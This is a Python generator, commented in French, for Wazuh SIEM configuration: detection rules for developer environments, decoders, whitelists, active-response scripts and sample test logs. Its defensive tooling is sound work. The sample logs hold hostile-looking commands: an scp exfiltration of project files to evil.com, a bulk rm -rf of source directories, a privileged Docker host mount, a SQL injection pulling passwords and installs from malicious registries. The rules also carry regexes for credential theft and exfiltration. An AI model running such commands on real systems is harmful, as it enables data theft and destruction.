#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Wazuh DevSec Config Generator
Expert senior cybersécurité + Python (clean code, typing, Jinja2, Pydantic)
Structure de sortie optimisée pour déploiement direct sur Wazuh
"""

from pathlib import Path
import shutil
from datetime import datetime
from typing import List, Dict
from jinja2 import Environment, FileSystemLoader
from pydantic import BaseModel
from rich.console import Console
from rich.progress import track

console = Console()

class RuleDefinition(BaseModel):
    rule_id: int
    level: int
    title: str
    description: str
    mitre: str
    regex: str
    group: str
    os: str = "Linux,Windows"
    frequency: int | None = None
    timeframe: int | None = None
    anti_fp_list: str | None = None
    if_sid: str | None = None

class WazuhConfigGenerator:
    def __init__(self):
        self.root = Path("output/wazuh-custom-devsec")
        self.templates = Path("wazuh_devsec_config_generator/templates")
        self.data_dir = Path("data")
        self._clean_output()
        self.env = Environment(loader=FileSystemLoader(self.templates))
        console.print("[bold green]🚀 Wazuh DevSec Generator démarré[/]")

    def _clean_output(self):
        if self.root.exists():
            shutil.rmtree(self.root)
        for d in [
            "etc/rules", "etc/decoders", "etc/lists/cdb",
            "etc/ossec.conf.d", "etc/active-response/bin",
            "etc/active-response/commands", "tests/sample-logs"
        ]:
            (self.root / d).mkdir(parents=True, exist_ok=True)

    def generate_rules(self):
        rules_dir = self.root / "etc/rules"
        rule_template = self.env.get_template("rule.jinja")

        # Règles officielles étendues (local_rules.xml avec overwrite pour les plus critiques)
        local_content = self.env.get_template("local_rules.jinja").render()
        (rules_dir / "local_rules.xml").write_text(local_content, encoding="utf-8")

        # 40 règles personnalisées (ID 100000-119999) organisées par thème
        rules_by_theme: Dict[str, List[RuleDefinition]] = {
            "git": [
                RuleDefinition(rule_id=101001, level=10, title="Git clone depuis IP externe", description="Détection de clone git depuis adresse IP externe non whitelistée", mitre="T1213", regex="git clone.*(http|ssh)://", group="git,devsec", anti_fp_list="whitelist_internal_ips"),
                RuleDefinition(rule_id=101002, level=12, title="Git credential extraction", description="Tentative d'extraction des credentials git", mitre="T1552.001", regex="git.*(credential|token|password)", group="git,devsec"),
                RuleDefinition(rule_id=101003, level=8, title="Git push vers repo externe", description="Push git vers repository externe non autorisé", mitre="T1567.001", regex="git push.*origin", group="git,devsec", anti_fp_list="whitelist_internal_ips"),
                RuleDefinition(rule_id=101004, level=11, title="Git config modification", description="Modification de configuration git suspecte", mitre="T1565.001", regex="git config.*user\.(email|name)", group="git,devsec"),
                RuleDefinition(rule_id=101005, level=9, title="Git stash pop sur code sensible", description="Restauration de git stash contenant du code sensible", mitre="T1560.001", regex="git stash pop|git stash apply", group="git,devsec"),
                RuleDefinition(rule_id=101006, level=13, title="Git force push destructif", description="Force push écrasant l'historique git", mitre="T1565.001", regex="git push.*--force", group="git,devsec"),
            ],
            "ide": [
                RuleDefinition(rule_id=102001, level=9, title="VSCode/IntelliJ lance process suspect", description="IDE lance des commandes system suspectes", mitre="T1059", regex="(code|idea).*?(powershell|curl|wget)", group="ide,devsec"),
                RuleDefinition(rule_id=102002, level=10, title="Extension IDE installation non autorisée", description="Installation d'extensions IDE depuis source externe", mitre="T1195.002", regex="(code|idea).*install.*extension", group="ide,devsec"),
                RuleDefinition(rule_id=102003, level=8, title="IDE debug sur process système", description="Session de debug IDE sur processus système", mitre="T1055.001", regex="(code|idea).*debug.*attach", group="ide,devsec"),
                RuleDefinition(rule_id=102004, level=11, title="IDE terminal execution non whitelistée", description="Exécution de commandes via terminal IDE", mitre="T1059", regex="(code|idea).*terminal.*exec", group="ide,devsec"),
                RuleDefinition(rule_id=102005, level=7, title="IDE file access patterns", description="Accès fichiers patterns suspects depuis IDE", mitre="T1083", regex="(code|idea).*open.*(\.env|\.key|\.pem)", group="ide,devsec"),
            ],
            "cicd": [
                RuleDefinition(rule_id=103001, level=11, title="CI/CD npm/pip install non-whitelist", description="Installation packages depuis registre non autorisé", mitre="T1195.002", regex="(jenkins|gitlab).*?(npm|pip).*install", group="cicd,devsec", anti_fp_list="whitelist_pypi_npm"),
                RuleDefinition(rule_id=103002, level=12, title="CI/CD pipeline modification", description="Modification non autorisée de pipeline CI/CD", mitre="T1565.001", regex="(jenkins|gitlab).*pipeline.*update", group="cicd,devsec"),
                RuleDefinition(rule_id=103003, level=10, title="CI/CD secret injection", description="Injection de secrets dans variables CI/CD", mitre="T1552.001", regex="(jenkins|gitlab).*secret.*set", group="cicd,devsec"),
                RuleDefinition(rule_id=103004, level=13, title="CI/CD docker privileged build", description="Build docker avec privilèges élevés", mitre="T1610", regex="(jenkins|gitlab).*docker.*--privileged", group="cicd,devsec"),
                RuleDefinition(rule_id=103005, level=9, title="CI/CD artifact download suspect", description="Téléchargement d'artefacts CI/CD depuis source externe", mitre="T1567.001", regex="(jenkins|gitlab).*download.*artifact", group="cicd,devsec"),
            ],
            "docker": [
                RuleDefinition(rule_id=104001, level=13, title="Docker --privileged ou host mount", description="Docker lancé avec privilèges ou mount host", mitre="T1610", regex="docker run.*(--privileged|--mount.*host)", group="docker"),
                RuleDefinition(rule_id=104002, level=11, title="Docker socket mount", description="Mount du socket docker dans container", mitre="T1610", regex="docker run.*-v.*docker.sock", group="docker"),
                RuleDefinition(rule_id=104003, level=10, title="Docker image from private registry", description="Pull d'image depuis registry privée non autorisée", mitre="T1195.002", regex="docker pull.*(internal|private)", group="docker"),
                RuleDefinition(rule_id=104004, level=12, title="Docker exec shell access", description="Accès shell dans container docker", mitre="T1059", regex="docker exec.*(/bin/bash|/bin/sh)", group="docker"),
                RuleDefinition(rule_id=104005, level=9, title="Docker volume mount sensitive", description="Mount de volumes sensibles dans container", mitre="T1083", regex="docker run.*-v.*(etc|root|home)", group="docker"),
            ],
            "ransomware": [
                RuleDefinition(rule_id=105001, level=12, title="Ransomware sur dossiers code", description="Activité ransomware sur répertoires de code", mitre="T1486", regex=".*(encrypt|crypto).*(\\.py|\\.js|\\.java)", frequency=10, timeframe=60, group="ransomware"),
                RuleDefinition(rule_id=105002, level=13, title="File extension modification bulk", description="Modification massive d'extensions de fichiers", mitre="T1486", regex=".*(\.exe|\.crypt|\.locked).*creation", frequency=15, timeframe=30, group="ransomware"),
                RuleDefinition(rule_id=105003, level=11, title="Ransom note creation", description="Création de fichiers de rançon", mitre="T1486", regex=".*(ransom|decrypt|readme).*\.txt", frequency=5, timeframe=60, group="ransomware"),
                RuleDefinition(rule_id=105004, level=12, title="Bulk file deletion", description="Suppression massive de fichiers de code", mitre="T1485", regex=".*rm.*-rf.*(src|lib|app)", frequency=8, timeframe=45, group="ransomware"),
            ],
            "insider": [
                RuleDefinition(rule_id=106001, level=10, title="Exfiltration massive de repo", description="Exfiltration de repository complet", mitre="T1041", regex="scp|rsync|tar.*(http|ssh)", group="insider"),
                RuleDefinition(rule_id=106002, level=11, title="Access to sensitive directories", description="Accès non autorisé à répertoires sensibles", mitre="T1083", regex=".*cd.*(\/etc\/|\/root\/|C:\\Windows)", frequency=5, timeframe=60, group="insider"),
                RuleDefinition(rule_id=106003, level=9, title="Multiple SSH connections", description="Connexions SSH multiples depuis même utilisateur", mitre="T1021.001", regex="ssh.*@.*accepted", frequency=10, timeframe=300, group="insider"),
                RuleDefinition(rule_id=106004, level="12", title="Data compression before transfer", description="Compression de données avant transfert", mitre="T1560.001", regex="(tar|zip|gzip).*large", group="insider"),
                RuleDefinition(rule_id=106005, level="10", title="USB device connection", description="Connexion de périphérique USB", mitre="T1091", regex="usb.*device.*connected", group="insider"),
            ],
            "web": [
                RuleDefinition(rule_id=107001, level=8, title="Web server config modification", description="Modification configuration serveur web", mitre="T1565.001", regex="(apache|nginx).*config.*reload", group="web,devsec"),
                RuleDefinition(rule_id=107002, level=10, title="Suspicious HTTP requests", description="Requêtes HTTP suspectes vers dev server", mitre="T1190", regex=".*(sql|union|select).*HTTP", group="web,devsec"),
                RuleDefinition(rule_id=107003, level=9, title="Web shell upload attempt", description="Tentative d'upload web shell", mitre="T1505.003", regex=".*(upload|POST).*\.(php|jsp|asp)", group="web,devsec"),
                RuleDefinition(rule_id=107004, level=11, title="Admin panel access", description="Accès panneau d'administration", mitre="T1078", regex="GET.*\/(admin|wp-admin|dashboard)", group="web,devsec"),
            ],
            "database": [
                RuleDefinition(rule_id=108001, level=10, title="Database dump creation", description="Création de dump base de données", mitre="T1007", regex="(mysqldump|pg_dump|mongoexport)", group="database,devsec"),
                RuleDefinition(rule_id=108002, level=11, title="Suspicious SQL queries", description="Requêtes SQL suspectes", mitre="T1190", regex="(union.*select|drop.*table|delete.*from)", group="database,devsec"),
                RuleDefinition(rule_id=108003, level=9, title="Database user creation", description="Création utilisateur base de données", mitre="T1078", regex="create.*user.*database", group="database,devsec"),
                RuleDefinition(rule_id=108004, level=12, title="Database backup encryption", description="Chiffrement backup base de données", mitre="T1486", regex="(encrypt|crypto).*backup", group="database,devsec"),
                RuleDefinition(rule_id=108005, level=13, title="Database access from unusual location", description="Accès base de données depuis emplacement inhabituel", mitre="T1078", regex=".*database.*access.*unusual.*location", group="database,devsec"),
            ]
        }

        for theme, rule_list in track(rules_by_theme.items(), description="Génération règles..."):
            content = f'<group name="devsec,{theme}">\n'
            for rule in rule_list:
                content += rule_template.render(rule=rule.dict()) + "\n"
            content += "</group>"
            (rules_dir / f"10{theme}_rules.xml").write_text(content, encoding="utf-8")

        console.print(f"[green]✅ 40+ règles personnalisées générées (low FP avec whitelists + frequency)[/]")

    def generate_decoders(self):
        decoders_dir = self.root / "etc/decoders"
        decoder_template = self.env.get_template("decoder.jinja")
        decoders_dir.mkdir(exist_ok=True)
        
        (decoders_dir / "dev-ide-decoder.xml").write_text(
            decoder_template.render(name="dev-ide", prematch="code|idea|VSCode", regex="(\S+) (\S+)"),
            encoding="utf-8"
        )
        (decoders_dir / "cicd-decoder.xml").write_text(
            decoder_template.render(name="cicd-runner", prematch="jenkins|gitlab-runner"),
            encoding="utf-8"
        )
        (decoders_dir / "docker-decoder.xml").write_text(
            decoder_template.render(name="docker", prematch="docker", regex="(\S+)\s+(\S+)\s+(.+)"),
            encoding="utf-8"
        )
        console.print("[green]✅ Décodeurs + sibling générés[/]")

    def generate_cdb_lists(self):
        lists_dir = self.root / "etc/lists/cdb"
        from wazuh_devsec_config_generator.utils import create_cdb_list

        create_cdb_list("whitelist_internal_ips", ["192.168.", "10.", "172.16.", "127.0.0.1"], lists_dir)
        create_cdb_list("whitelist_tools", ["git", "docker", "mvn", "npm", "pip", "code", "idea", "vim", "nano"], lists_dir)
        create_cdb_list("whitelist_dev_paths", ["/home/dev/projects", "C:\\Dev", "/var/www", "/opt/projects"], lists_dir)
        create_cdb_list("whitelist_pypi_npm", ["pypi.org", "npmjs.com", "registry.npmjs.org", "files.pythonhosted.org"], lists_dir)
        create_cdb_list("whitelist_domains", ["github.com", "gitlab.com", "bitbucket.org", "docker.io"], lists_dir)

        (self.root / "etc/custom_lists.conf").write_text(
            """<list name="whitelist_internal_ips" path="lists/cdb/whitelist_internal_ips.txt" />
<list name="whitelist_tools" path="lists/cdb/whitelist_tools.txt" />
<list name="whitelist_dev_paths" path="lists/cdb/whitelist_dev_paths.txt" />
<list name="whitelist_pypi_npm" path="lists/cdb/whitelist_pypi_npm.txt" />
<list name="whitelist_domains" path="lists/cdb/whitelist_domains.txt" />""",
            encoding="utf-8"
        )
        console.print("[green]✅ 5 listes CDB + config générées[/]")

    def generate_active_responses(self):
        ar_bin = self.root / "etc/active-response/bin"
        ar_bin.mkdir(parents=True, exist_ok=True)

        scripts = {
            "quarantine-file.py": """#!/usr/bin/env python3
import sys, shutil, os
from pathlib import Path

def quarantine_file(file_path):
    try:
        quarantine_dir = Path("/var/ossec/quarantine")
        quarantine_dir.mkdir(exist_ok=True)
        
        src = Path(file_path)
        dst = quarantine_dir / src.name
        
        shutil.move(str(src), str(dst))
        print(f"✅ Fichier quarantiné : {file_path} -> {dst}")
        return 0
    except Exception as e:
        print(f"❌ Erreur quarantaine : {e}")
        return 1

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: quarantine-file.py <file_path>")
        sys.exit(1)
    
    sys.exit(quarantine_file(sys.argv[1]))""",
            "block-ip.py": """#!/usr/bin/env python3
import sys
import subprocess

def block_ip(ip_address):
    try:
        # Block with iptables
        subprocess.run(["iptables", "-A", "INPUT", "-s", ip_address, "-j", "DROP"], check=True)
        subprocess.run(["iptables", "-A", "OUTPUT", "-d", ip_address, "-j", "DROP"], check=True)
        print(f"✅ IP bloquée : {ip_address}")
        return 0
    except subprocess.CalledProcessError as e:
        print(f"❌ Erreur blocage IP {ip_address}: {e}")
        return 1

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: block-ip.py <ip_address>")
        sys.exit(1)
    
    sys.exit(block_ip(sys.argv[1]))""",
            "kill-suspicious-process.py": """#!/usr/bin/env python3
import sys
import subprocess
import signal
import os

def kill_process(pid):
    try:
        pid = int(pid)
        os.kill(pid, signal.SIGTERM)
        print(f"✅ Processus {pid} terminé")
        return 0
    except (ValueError, ProcessLookupError) as e:
        print(f"❌ Erreur processus {pid}: {e}")
        return 1

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: kill-suspicious-process.py <pid>")
        sys.exit(1)
    
    sys.exit(kill_process(sys.argv[1]))""",
            "alert-slack.py": """#!/usr/bin/env python3
import sys
import json
from datetime import datetime

def send_alert(rule_id, message):
    # Placeholder pour Slack webhook
    alert_data = {
        "timestamp": datetime.now().isoformat(),
        "rule_id": rule_id,
        "message": message,
        "severity": "high"
    }
    
    print(f"🚨 Alerte Wazuh - Règle {rule_id}: {message}")
    # TODO: Intégrer webhook Slack
    return 0

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: alert-slack.py <rule_id> <message>")
        sys.exit(1)
    
    sys.exit(send_alert(sys.argv[1], " ".join(sys.argv[2:])))"""
        }
        
        for name, code in scripts.items():
            (ar_bin / name).write_text(code, encoding="utf-8")
            (ar_bin / name).chmod(0o750)

        commands_content = self.env.get_template("ar_command.jinja").render()
        commands_content = commands_content.strip()
        (self.root / "etc/active-response/commands/custom-commands.xml").write_text(
            commands_content,
            encoding="utf-8"
        )
        console.print("[green]✅ Active Responses Python générées[/]")

    def generate_ossec_conf_fragments(self):
        conf_dir = self.root / "etc/ossec.conf.d"
        conf_dir.mkdir(exist_ok=True)

        fragments = {
            "10-syscheck-dev-dirs.xml": self.env.get_template("syscheck.jinja").render(paths=["/home/dev/projects", "C:\\Dev", "/opt/projects", "/var/www"]),
            "20-active-response.xml": """<active-response>
    <command>quarantine-file</command>
    <location>local</location>
    <level>12</level>
    <timeout>300</timeout>
</active-response>
<active-response>
    <command>block-ip</command>
    <location>local</location>
    <level>13</level>
    <timeout>3600</timeout>
</active-response>
<active-response>
    <command>kill-suspicious-process</command>
    <location>local</location>
    <level>15</level>
    <timeout>0</timeout>
</active-response>""",
            "30-vuln-detector.xml": """<vulnerability-detection>
    <enabled>yes</enabled>
    <interval>86400</interval>
    <run_on_start>yes</run_on_start>
    <provider>
        <name>redhat</name>
        <enabled>yes</enabled>
        <update_interval>3600</update_interval>
    </provider>
    <provider>
        <name>debian</name>
        <enabled>yes</enabled>
        <update_interval>3600</update_interval>
    </provider>
</vulnerability-detection>""",
            "40-sca-policy.xml": """<sca>
    <enabled>yes</enabled>
    <scan_on_start>yes</scan_on_start>
    <interval>86400</interval>
    <skip_nfs>yes</skip_nfs>
</sca>""",
            "50-logcollector.xml": """<localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
</localfile>
<localfile>
    <log_format>apache</log_format>
    <location>/var/log/apache2/access.log</location>
</localfile>
<localfile>
    <log_format>command</log_format>
    <command>docker logs --since 1m</command>
</localfile>"""
        }
        
        for name, content in fragments.items():
            (conf_dir / name).write_text(content, encoding="utf-8")
        console.print("[green]✅ Fragments ossec.conf (manager + agents Linux/Windows) générés[/]")

    def generate_tests(self):
        tests_dir = self.root / "tests/sample-logs"
        tests_dir.mkdir(parents=True, exist_ok=True)
        
        sample_logs = [
            ("git-suspicious.txt", "Mar 19 10:38:22 dev01 git[1234]: git clone https://evil.com/repo.git"),
            ("vscode-curl.txt", "Mar 19 10:40:00 workstation code[5678]: code -- curl -k https://malicious.com"),
            ("jenkins-install.txt", "Mar 19 10:42:15 jenkins-worker pip[8901]: pip install https://suspicious-pypi.com/package-0.1.tar.gz"),
            ("docker-privileged.txt", "Mar 19 10:44:30 server docker[2345]: docker run --privileged -v /:/host ubuntu:latest"),
            ("ransomware-encrypt.txt", "Mar 19 10:46:00 dev-machine python[3456]: encrypt_file /home/dev/projects/app/main.py"),
            ("ssh-exfil.txt", "Mar 19 10:48:22 server ssh[4567]: user@dev-machine scp -r /home/dev/projects/* external@evil.com:/tmp/"),
            ("web-shell.txt", "Mar 19 10:50:11 webserver apache[6789]: POST /upload.php HTTP/1.1 200 1234"),
            ("db-dump.txt", "Mar 19 10:52:33 db-server mysqldump[7890]: mysqldump -u root -p production_db > backup.sql"),
            ("git-force-push.txt", "Mar 19 10:54:44 dev01 git[8901]: git push --force origin master"),
            ("ide-debug.txt", "Mar 19 10:56:55 workstation idea[9012]: Debug attached to process 1234 (sshd)"),
            ("docker-socket.txt", "Mar 19 10:58:00 server docker[0123]: docker run -v /var/run/docker.sock:/var/run/docker.sock alpine"),
            ("npm-install.txt", "Mar 19 11:00:11 jenkins npm[1234]: npm install http://malicious-registry.com/package-1.0.0.tgz"),
            ("file-encryption.txt", "Mar 19 11:02:22 dev-machine crypto[2345]: File encrypted: /home/dev/projects/src/config.js -> /home/dev/projects/src/config.js.crypt"),
            ("usb-connect.txt", "Mar 19 11:04:33 workstation kernel[3456]: usb 1-2: new high-speed USB device number 3 using xhci_hcd"),
            ("nginx-config.txt", "Mar 19 11:06:44 webserver nginx[4567]: nginx: configuration file /etc/nginx/nginx.conf test is successful"),
            ("sql-injection.txt", "Mar 19 11:08:55 db-server mysql[5678]: SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin"),
            ("git-stash.txt", "Mar 19 11:10:00 dev01 git[6789]: git stash pop"),
            ("docker-exec.txt", "Mar 19 11:12:11 server docker[7890]: docker exec -it container123 /bin/bash"),
            ("pipeline-modify.txt", "Mar 19 11:14:22 gitlab-runner gitlab[8901]: Updated .gitlab-ci.yml with new deployment stage"),
            ("bulk-delete.txt", "Mar 19 11:16:33 dev-machine rm[9012]: rm -rf /home/dev/projects/src /home/dev/projects/lib"),
        ]
        
        for name, log in sample_logs:
            (tests_dir / name).write_text(log, encoding="utf-8")
        
        # Expected results file
        expected_results = """# Résultats attendus pour wazuh-logtest
# Format: log_file -> expected_rule_id

git-suspicious.txt -> 101001
vscode-curl.txt -> 102001
jenkins-install.txt -> 103001
docker-privileged.txt -> 104001
ransomware-encrypt.txt -> 105001
ssh-exfil.txt -> 106001
web-shell.txt -> 107003
db-dump.txt -> 108001
git-force-push.txt -> 101006
ide-debug.txt -> 102003
docker-socket.txt -> 104002
npm-install.txt -> 103001
file-encryption.txt -> 105001
usb-connect.txt -> 106005
nginx-config.txt -> 107001
sql-injection.txt -> 108002
git-stash.txt -> 101005
docker-exec.txt -> 104004
pipeline-modify.txt -> 103002
bulk-delete.txt -> 105004"""
        
        (tests_dir / "expected_results.txt").write_text(expected_results, encoding="utf-8")
        console.print("[green]✅ 20 logs de test + résultats attendus générés[/]")

    def run(self):
        self.generate_rules()
        self.generate_decoders()
        self.generate_cdb_lists()
        self.generate_active_responses()
        self.generate_ossec_conf_fragments()
        self.generate_tests()
        console.print(f"\n[bold green]🎉 Génération TERMINÉE ![/]\nDossier prêt : {self.root.absolute()}")
        console.print("[yellow]Lancez ensuite : python deploy.py[/]")

def main():
    WazuhConfigGenerator().run()

if __name__ == "__main__":
    main()
